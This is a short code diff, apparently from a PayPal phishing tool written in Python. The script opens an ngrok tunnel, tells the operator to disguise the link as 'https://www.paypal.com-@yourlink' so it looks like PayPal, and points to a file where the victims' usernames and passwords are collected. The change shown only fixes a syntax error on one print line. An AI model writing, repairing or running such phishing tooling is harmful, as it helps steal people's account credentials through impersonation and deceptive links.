@@ -12,5 +12,5 @@ with open("server","w") as phplog:
 link=ngrok.connect(4040,"http")
 print(link)
 print(Fore.GREEN+" youcan send link :https://www.paypal.com-@yourlink")
-print(Fore.GREEN+"user and pass target => cd paypal/usernames.txt
+print(Fore.GREEN+"user and pass target => cd paypal/usernames.txt")
 input("")
